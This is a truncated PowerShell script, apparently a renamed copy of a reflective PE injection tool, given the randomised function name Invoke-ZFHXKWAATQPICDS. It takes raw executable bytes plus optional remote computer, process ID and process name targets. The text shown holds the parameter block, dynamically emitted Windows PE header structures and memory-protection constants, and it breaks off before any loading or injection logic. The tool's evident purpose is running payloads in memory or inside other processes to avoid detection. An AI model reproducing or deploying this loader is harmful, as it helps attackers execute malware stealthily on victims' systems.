<head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">
function Invoke-ZFHXKWAATQPICDS
{

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,

	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',

	[Parameter(Position = 3)]
	[String]
	$ExeArgs,

	[Parameter(Position = 4)]
	[Int32]
	$ProcId,

	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,

		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)

	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType


		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType


		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType


		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType



		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object

		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
